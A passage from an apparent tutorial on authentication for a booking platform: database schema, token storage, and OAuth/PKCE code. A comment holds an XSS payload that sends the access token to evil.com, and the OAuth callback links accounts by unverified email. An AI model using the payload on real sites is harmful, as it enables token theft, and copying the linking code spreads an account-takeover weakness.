  expiresAt   DateTime  @map("expires_at")
  createdAt   DateTime  @default(now()) @map("created_at")
  revokedAt   DateTime? @map("revoked_at")
  revokedBy   String?   @map("revoked_by") @db.VarChar(50)    // 'user', 'admin', 'system'

  user        User      @relation(fields: [userId], references: [id], onDelete: Cascade)

  @@map("sessions")
  @@index([userId])
  @@index([expiresAt])
  @@index([isActive])
}

model ApiKey {
  id          Int       @id @default(autoincrement())
  userId      BigInt?   @map("user_id")           // null for service keys
  keyHash     String    @unique @map("key_hash") @db.VarChar(255)
  keyPrefix   String    @map("key_prefix") @db.VarChar(10)  // First 8 chars for identification
  name        String    @db.VarChar(100)
  scopes      Json      // ["bookings:read", "bookings:write"]
  rateLimit   Int       @default(1000) @map("rate_limit")   // Requests per minute
  isActive    Boolean   @default(true) @map("is_active")
  lastUsedAt  DateTime? @map("last_used_at")
  expiresAt   DateTime? @map("expires_at")
  createdAt   DateTime  @default(now()) @map("created_at")

  user        User?     @relation(fields: [userId], references: [id], onDelete: Cascade)

  @@map("api_keys")
  @@index([keyHash])
  @@index([userId])
}

model AuditLog {
  id          BigInt   @id @default(autoincrement())
  userId      BigInt?  @map("user_id")
  action      String   @db.VarChar(100)     // 'login', 'logout', 'role_change', 'password_reset'
  resource    String?  @db.VarChar(100)
  resourceId  String?  @map("resource_id") @db.VarChar(100)
  details     Json?
  ipAddress   String?  @map("ip_address") @db.VarChar(45)
  userAgent   String?  @map("user_agent") @db.VarChar(500)
  createdAt   DateTime @default(now()) @map("created_at")

  user        User?    @relation(fields: [userId], references: [id])

  @@map("audit_logs")
  @@index([userId])
  @@index([action])
  @@index([createdAt])
}
```

### Equivalent Raw SQL

```sql
-- Users table
CREATE TABLE users (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    first_name VARCHAR(100) NOT NULL,
    last_name VARCHAR(100) NOT NULL,
    phone VARCHAR(20),
    is_active BOOLEAN DEFAULT TRUE,
    email_verified BOOLEAN DEFAULT FALSE,
    mfa_enabled BOOLEAN DEFAULT FALSE,
    mfa_secret VARCHAR(255),
    failed_login_attempts INT DEFAULT 0,
    locked_until TIMESTAMP NULL,
    last_login_at TIMESTAMP NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,

    INDEX idx_email (email),
    INDEX idx_active (is_active)
);

-- Roles table
CREATE TABLE roles (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(50) NOT NULL UNIQUE,
    description VARCHAR(255),
    is_system BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Seed default roles
INSERT INTO roles (name, description, is_system) VALUES
('guest', 'Unauthenticated visitor', TRUE),
('user', 'Registered customer', TRUE),
('premium', 'Premium customer with enhanced limits', TRUE),
('admin', 'Internal staff managing bookings', TRUE),
('super_admin', 'System administrator with full access', TRUE);

-- Permissions table
CREATE TABLE permissions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    resource VARCHAR(100) NOT NULL,
    action VARCHAR(50) NOT NULL,
    description VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

    UNIQUE KEY uniq_resource_action (resource, action)
);

-- Seed permissions
INSERT INTO permissions (resource, action, description) VALUES
('bookings', 'create', 'Create new bookings'),
('bookings', 'read', 'View booking details'),
('bookings', 'update', 'Modify existing bookings'),
('bookings', 'delete', 'Cancel bookings'),
('reports', 'read', 'View business reports'),
('users', 'read', 'View user profiles'),
('users', 'update', 'Modify user accounts'),
('users', 'delete', 'Deactivate user accounts'),
('system', 'configure', 'Modify system configuration');

-- User-Role junction table
CREATE TABLE user_roles (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT NOT NULL,
    role_id INT NOT NULL,
    granted_by BIGINT,
    granted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NULL,

    UNIQUE KEY uniq_user_role (user_id, role_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (role_id) REFERENCES roles(id) ON DELETE CASCADE,
    INDEX idx_user_id (user_id),
    INDEX idx_role_id (role_id)
);

-- Role-Permission junction table
CREATE TABLE role_permissions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    role_id INT NOT NULL,
    permission_id INT NOT NULL,
    conditions JSON,

    UNIQUE KEY uniq_role_perm (role_id, permission_id),
    FOREIGN KEY (role_id) REFERENCES roles(id) ON DELETE CASCADE,
    FOREIGN KEY (permission_id) REFERENCES permissions(id) ON DELETE CASCADE
);

-- Sessions table
CREATE TABLE sessions (
    id VARCHAR(36) PRIMARY KEY,
    user_id BIGINT NOT NULL,
    ip_address VARCHAR(45) NOT NULL,
    user_agent VARCHAR(500) NOT NULL,
    device_id VARCHAR(255),
    is_active BOOLEAN DEFAULT TRUE,
    last_used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    revoked_at TIMESTAMP NULL,
    revoked_by VARCHAR(50),

    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_user_id (user_id),
    INDEX idx_expires (expires_at),
    INDEX idx_active (is_active)
);

-- API Keys table
CREATE TABLE api_keys (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT,
    key_hash VARCHAR(255) NOT NULL UNIQUE,
    key_prefix VARCHAR(10) NOT NULL,
    name VARCHAR(100) NOT NULL,
    scopes JSON NOT NULL,
    rate_limit INT DEFAULT 1000,
    is_active BOOLEAN DEFAULT TRUE,
    last_used_at TIMESTAMP NULL,
    expires_at TIMESTAMP NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    INDEX idx_key_hash (key_hash),
    INDEX idx_user_id (user_id)
);

-- Audit logs table
CREATE TABLE audit_logs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    user_id BIGINT,
    action VARCHAR(100) NOT NULL,
    resource VARCHAR(100),
    resource_id VARCHAR(100),
    details JSON,
    ip_address VARCHAR(45),
    user_agent VARCHAR(500),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,

    FOREIGN KEY (user_id) REFERENCES users(id),
    INDEX idx_user_id (user_id),
    INDEX idx_action (action),
    INDEX idx_created (created_at)
);
```

### Prisma Client Usage Examples

```typescript
// Registration: Create user with default role
async function registerUser(dto: RegisterDto): Promise<User> {
  const passwordHash = await passwordService.hashPassword(dto.password);

  return prisma.$transaction(async (tx) => {
    // Create the user
    const user = await tx.user.create({
      data: {
        email: dto.email,
        passwordHash,
        firstName: dto.firstName,
        lastName: dto.lastName,
        phone: dto.phone
      }
    });

    // Assign default 'user' role
    const userRole = await tx.role.findUnique({ where: { name: 'user' } });
    await tx.userRole.create({
      data: {
        userId: user.id,
        roleId: userRole!.id
      }
    });

    // Audit log
    await tx.auditLog.create({
      data: {
        userId: user.id,
        action: 'register',
        details: { email: dto.email }
      }
    });

    return user;
  });
}

// Fetch user with roles and permissions for JWT claims
async function getUserWithPermissions(userId: bigint) {
  return prisma.user.findUnique({
    where: { id: userId },
    include: {
      userRoles: {
        where: {
          OR: [
            { expiresAt: null },
            { expiresAt: { gt: new Date() } }
          ]
        },
        include: {
          role: {
            include: {
              rolePermissions: {
                include: { permission: true }
              }
            }
          }
        }
      }
    }
  });
}

// Equivalent raw SQL for the above Prisma query
// SELECT u.*, r.name as role_name, p.resource, p.action
// FROM users u
// JOIN user_roles ur ON u.id = ur.user_id
//   AND (ur.expires_at IS NULL OR ur.expires_at > NOW())
// JOIN roles r ON ur.role_id = r.id
// JOIN role_permissions rp ON r.id = rp.role_id
// JOIN permissions p ON rp.permission_id = p.id
// WHERE u.id = ?;
```

> **Checkpoint:** Look at the `UserRole` model. Why does it have an `expiresAt` field? Think about temporary access: a contractor who needs admin access for two weeks, or a customer support agent covering a holiday shift. Time-bound roles are safer than permanent grants that someone forgets to revoke.

---

## Token Storage Security — httpOnly Cookies vs localStorage vs sessionStorage

Where you store tokens on the client side is as important as how you generate them. The wrong storage mechanism can turn a well-designed auth system into an open door.

### The Naive Approach: localStorage

```typescript
// DANGEROUS: Storing tokens in localStorage
localStorage.setItem('accessToken', response.data.accessToken);
localStorage.setItem('refreshToken', response.data.refreshToken);

// Every XSS vulnerability can steal both tokens
// <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'))</script>
```

**Why it breaks:** `localStorage` is accessible to *any* JavaScript running on the page. If your application has a single Cross-Site Scripting (XSS) vulnerability -- an unescaped user input, a compromised third-party script, a malicious ad -- the attacker's JavaScript can read every token from localStorage and exfiltrate them to a remote server. Game over.

### The Correct Approach: httpOnly Cookies + Memory

| Storage | Accessible via JS | Survives page reload | Vulnerable to XSS | Vulnerable to CSRF | Our verdict |
|---|---|---|---|---|---|
| localStorage | Yes | Yes | **YES** -- tokens stolen | No | Never for tokens |
| sessionStorage | Yes | No (tab only) | **YES** -- tokens stolen | No | Never for tokens |
| httpOnly cookie | **No** | Yes | No -- JS cannot read | YES -- but mitigated | Refresh token here |
| In-memory variable | Yes (but scoped) | No | Harder to steal | No | Access token here |

Our strategy is a **split storage pattern**:

```typescript
// auth-client.ts -- Browser-side token management

class AuthClient {
  // Access token: stored in memory only (JavaScript variable)
  // Pros: Not in any persistent storage, not accessible via document.cookie
  // Cons: Lost on page refresh (that's fine -- we use the refresh token)
  private accessToken: string | null = null;

  async login(email: string, password: string): Promise<void> {
    const response = await fetch('/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',   // CRITICAL: sends and receives cookies
      body: JSON.stringify({ email, password })
    });

    const data = await response.json();

    // Access token comes in the response body -- store in memory
    this.accessToken = data.accessToken;

    // Refresh token comes as a Set-Cookie header with httpOnly flag
    // The browser stores it automatically -- JavaScript CANNOT read it
    // Cookie attributes: HttpOnly; Secure; SameSite=Strict; Path=/auth
  }

  async makeAuthenticatedRequest(url: string, options: RequestInit = {}): Promise<Response> {
    // If access token is expired or missing, refresh first
    if (!this.accessToken || this.isTokenExpired(this.accessToken)) {
      await this.refreshAccessToken();
    }

    return fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.accessToken}`
      }
    });
  }

  private async refreshAccessToken(): Promise<void> {
    // The refresh token cookie is sent automatically by the browser
    // because we set credentials: 'include'
    const response = await fetch('/auth/refresh', {
      method: 'POST',
      credentials: 'include'   // Browser sends the httpOnly cookie
    });

    if (!response.ok) {
      // Refresh token expired or revoked -- user must log in again
      this.accessToken = null;
      window.location.href = '/login';
      return;
    }

    const data = await response.json();
    this.accessToken = data.accessToken;
  }

  private isTokenExpired(token: string): boolean {
    try {
      const payload = JSON.parse(atob(token.split('.')[1]));
      return payload.exp * 1000 < Date.now() - 30000; // 30s buffer
    } catch {
      return true;
    }
  }
}
```

**Server-side cookie configuration:**

```typescript
// auth.controller.ts -- Setting the refresh token cookie
@Post('/login')
async login(@Body() dto: LoginDto, @Res() res: Response) {
  const { accessToken, refreshToken } = await this.authService.login(dto);

  // Set refresh token as httpOnly cookie
  res.cookie('refresh_token', refreshToken, {
    httpOnly: true,      // JavaScript CANNOT read this cookie
    secure: true,        // Only sent over HTTPS
    sameSite: 'strict',  // Not sent with cross-origin requests (CSRF protection)
    path: '/auth',       // Only sent to /auth/* endpoints (not to API calls)
    maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days in milliseconds
    domain: '.bookingplatform.com'      // Shared across subdomains
  });

  // Access token in the response body (stored in JS memory by client)
  res.json({ accessToken });
}
```

> **Key Term:** **httpOnly Cookie** -- A cookie with the `HttpOnly` flag set, which prevents JavaScript from reading it via `document.cookie`. The browser automatically sends the cookie with matching requests, but client-side scripts cannot access its value. This eliminates token theft via XSS attacks.

> **Common Mistake:** Setting `sameSite: 'none'` to make cross-origin requests work during development, then forgetting to change it for production. `SameSite=None` allows the cookie to be sent with cross-origin requests, which re-opens the door to CSRF attacks. Always use `Strict` or `Lax` for auth cookies.

---

## OAuth 2.0 + OpenID Connect — Delegated Authentication

So far, we have built our own username/password auth system. But many users prefer to "Log in with Google" or "Log in with GitHub." OAuth 2.0 is the protocol that makes this possible, and OpenID Connect (OIDC) extends it for authentication.

> **Key Term:** **OAuth 2.0** -- An authorization framework that allows a third-party application to obtain limited access to a user's resources on another service (like Google) without the user sharing their password. The user grants permission, and the third-party receives a token with specific scopes.

> **Key Term:** **OpenID Connect (OIDC)** -- An identity layer built on top of OAuth 2.0. While OAuth 2.0 is about *authorization* (what can the app do?), OIDC adds *authentication* (who is the user?). OIDC introduces the `id_token` -- a JWT containing claims about who the user is.

### Authorization Code Flow with PKCE

PKCE (Proof Key for Code Exchange, pronounced "pixy") is the recommended flow for all clients -- web apps, mobile apps, and single-page applications. It prevents authorization code interception attacks.

```
  Browser                Our Backend          Google (Auth Provider)
    │                         │                       │
    │  1. Click "Login        │                       │
    │     with Google"        │                       │
    │                         │                       │
    │  Generate:              │                       │
    │  code_verifier =        │                       │
    │    random(43-128 chars) │                       │
    │  code_challenge =       │                       │
    │    SHA256(code_verifier)│                       │
    │                         │                       │
    │  2. Redirect to Google  │                       │
    │─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─►│
    │  GET /authorize?        │                       │
    │    response_type=code   │                       │
    │    client_id=xxx        │                       │
    │    redirect_uri=...     │                       │
    │    scope=openid email   │                       │
    │    state=<csrf_token>   │                       │
    │    code_challenge=...   │                       │
    │    code_challenge_      │                       │
    │      method=S256        │                       │
    │                         │                       │
    │  3. User logs in,       │                       │
    │     grants permission   │                       │
    │                         │                       │
    │  4. Google redirects    │                       │
    │◄─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─│
    │  302 → /callback?       │                       │
    │    code=AUTH_CODE        │                       │
    │    state=<csrf_token>   │                       │
    │                         │                       │
    │  5. Send code to backend│                       │
    │────────────────────────►│                       │
    │  POST /auth/google/     │                       │
    │    callback             │                       │
    │  {code, code_verifier}  │                       │
    │                         │  6. Exchange code     │
    │                         │     for tokens        │
    │                         │──────────────────────►│
    │                         │  POST /token          │
    │                         │  {code,               │
    │                         │   code_verifier,      │
    │                         │   client_secret}      │
    │                         │                       │
    │                         │  7. Google verifies   │
    │                         │  SHA256(code_verifier)│
    │                         │  == code_challenge    │
    │                         │                       │
    │                         │  {access_token,       │
    │                         │   id_token,           │
    │                         │   refresh_token}      │
    │                         │◄──────────────────────│
    │                         │                       │
    │                         │  8. Decode id_token   │
    │                         │  → get user email,    │
    │                         │    name, picture      │
    │                         │                       │
    │                         │  9. Find or create    │
    │                         │  user in OUR database │
    │                         │                       │
    │                         │  10. Issue OUR JWT    │
    │  {our_access_token}     │  pair (RS256)         │
    │  Set-Cookie:            │                       │
    │   refresh_token=...     │                       │
    │◄────────────────────────│                       │
    │                         │                       │
```

**Implementation:**

```typescript
// oauth.service.ts
import { OAuth2Client } from 'google-auth-library';

export class OAuthService {
  private googleClient: OAuth2Client;

  constructor() {
    this.googleClient = new OAuth2Client(
      process.env.GOOGLE_CLIENT_ID,
      process.env.GOOGLE_CLIENT_SECRET,
      process.env.GOOGLE_REDIRECT_URI      // https://api.bookingplatform.com/auth/google/callback
    );
  }

  // Step 1: Generate the authorization URL
  getGoogleAuthUrl(state: string, codeChallenge: string): string {
    return this.googleClient.generateAuthUrl({
      access_type: 'offline',              // Get a refresh token from Google
      scope: ['openid', 'email', 'profile'],
      state,                               // CSRF protection
      code_challenge: codeChallenge,
      code_challenge_method: 'S256'
    });
  }

  // Steps 6-10: Exchange code for user info, create our own JWT
  async handleGoogleCallback(
    code: string,
    codeVerifier: string
  ): Promise<TokenPair> {
    // Exchange authorization code for Google tokens
    const { tokens } = await this.googleClient.getToken({
      code,
      codeVerifier                         // PKCE: proves we initiated the flow
    });

    // Verify and decode Google's id_token
    const ticket = await this.googleClient.verifyIdToken({
      idToken: tokens.id_token!,
      audience: process.env.GOOGLE_CLIENT_ID
    });

    const googleUser = ticket.getPayload()!;
    //  { sub: '12345', email: 'jane@gmail.com', name: 'Jane Doe', picture: '...' }

    // Find or create user in OUR database
    let user = await prisma.user.findUnique({
      where: { email: googleUser.email! }
    });

    if (!user) {
      user = await prisma.user.create({
        data: {
          email: googleUser.email!,
          firstName: googleUser.given_name || '',
          lastName: googleUser.family_name || '',
          passwordHash: '',                // No password for OAuth users
          emailVerified: googleUser.email_verified || false,
          userRoles: {
            create: {
              roleId: 2                    // Default 'user' role
            }
          }
        }
      });
    }

    // Issue OUR JWT pair -- Google's tokens are not used beyond this point
    return this.authService.generateTokenPair(user);
  }
}
```

### Client Credentials Flow (Service-to-Service)

For internal microservices or trusted backend partners, OAuth 2.0 offers the Client Credentials flow. No user is involved -- the service authenticates as itself.

```typescript
// client-credentials.service.ts
// Used by partner APIs (e.g., a travel agency integrating with our platform)

export class ClientCredentialsService {
  async authenticateClient(
    clientId: string,
    clientSecret: string
  ): Promise<{ accessToken: string }> {
    // Look up the registered client
    const client = await prisma.apiKey.findFirst({
      where: {
        keyPrefix: clientId.substring(0, 8),
        isActive: true
      }
    });

    if (!client) throw new UnauthorizedError('Unknown client');

    // Verify the client secret against the stored hash\n    const valid = await argon2.verify(client.keyHash, clientSecret);
    if (!valid) throw new UnauthorizedError('Invalid client credentials');

    // Issue a service-level access token (no user claims)
    const accessToken = jwt.sign(
      {
        clientId,
        scopes: client.scopes,       // ["bookings:read", "search:read"]
        type: 'service'
      },
      this.privateKey,
      {
        algorithm: 'RS256',
        expiresIn: '1h',
        issuer: 'booking-platform',
        audience: 'booking-api'
      }
    );

    return { accessToken };
  }
}
```

> **Analogy:** OAuth is like valet parking. You do not give the valet your house key, your office key, and your car key. You give them *only* the car key (scoped access). They can park and retrieve your car, but they cannot enter your house. If the valet loses the key, you revoke that key without changing all your other locks. OAuth works the same way: the user grants your app limited, revocable access to specific resources, without sharing their password.

---
